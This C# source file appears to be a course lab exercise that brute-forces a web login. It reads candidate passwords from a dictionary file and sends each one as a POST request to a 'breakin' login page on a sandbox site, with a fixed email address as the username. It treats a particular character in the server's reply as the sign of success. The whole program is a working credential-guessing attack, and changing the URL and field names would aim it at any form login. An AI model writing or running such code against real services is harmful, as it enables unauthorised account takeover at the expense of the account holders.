using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace Examples.System.Net
{
    public class WebRequestPostExample
    {
        static List<string> BuildPasswordList() {
            List<string> pwds = new List<string>();
            StreamReader srp = new StreamReader("../../../password_dictionary.txt");
            while (!srp.EndOfStream) {
                string input = srp.ReadLine();
                string[] lineArray = input.Split(',');
                for (int i = 0; i < lineArray.Length; i++) {
                    if (lineArray[i].Trim() != "") {
                        string formattedLine 
                            = lineArray[i].Replace("'", "").Trim();
                        if (formattedLine != "") {
                            pwds.Add(formattedLine);
                        }
                    }    
                }
            }
            return pwds;
        }

        public static string FindPassword(List<string> passwordArray)
        {
            string foundPassword = "not found";

            foreach (string password in passwordArray)
            {
               bool testPassword = PostRequest(password);
                Console.WriteLine(password);
                if (testPassword == true)
                {
                    foundPassword = password;
                    return foundPassword;
                }
            }

            return foundPassword;
        }


        public static bool PostRequest(string passWordTest)
        {
            // Create a request using a URL that can receive a post. 
            WebRequest request = WebRequest.Create("http://ssdsandbox.com/breakin/welcome.php");
            // Set the Method property of the request to POST.
            request.Method = "POST";

            bool result = false;

            // Request body.
            //string postData = "txtName=Bob&txtPwd=P@ssw0rd";
            string postData = $"txtName=tferris2@my.bcit.ca&txtPwd={passWordTest}";
            byte[] byteArray = Encoding.UTF8.GetBytes(postData);

            // Set the ContentType property of the WebRequest.
            request.ContentType = "application/x-www-form-urlencoded";
            // Set the ContentLength property of the WebRequest.
            request.ContentLength = byteArray.Length;

            // Get the request stream.
            Stream dataStream = request.GetRequestStream();
            // Write the data to the request stream.
            dataStream.Write(byteArray, 0, byteArray.Length);
            // Close the Stream object.
            dataStream.Close();

            // Get the response.
            WebResponse response = request.GetResponse();

            // Display the status.
            Console.WriteLine(((HttpWebResponse)response).StatusDescription);

            // Get the stream containing content returned by the server.
            dataStream = response.GetResponseStream();
            // Open the stream using a StreamReader for easy access.
            StreamReader reader = new StreamReader(dataStream);
            // Read the content.
            string responseFromServer = reader.ReadToEnd();
            // Display the content.
            //  Console.WriteLine(responseFromServer);

            string test = responseFromServer[12].ToString();

            if (test == "W")
            {
                result = true;
            } else {
                result = false;
            }

             // Clean up the streams.
            reader.Close();
            dataStream.Close();
            response.Close();

            return result;
        }

        public static void Main()
        {
            List<string> pwds = BuildPasswordList();

            Console.WriteLine(FindPassword(pwds));
            Console.ReadLine();
        }
    }
}
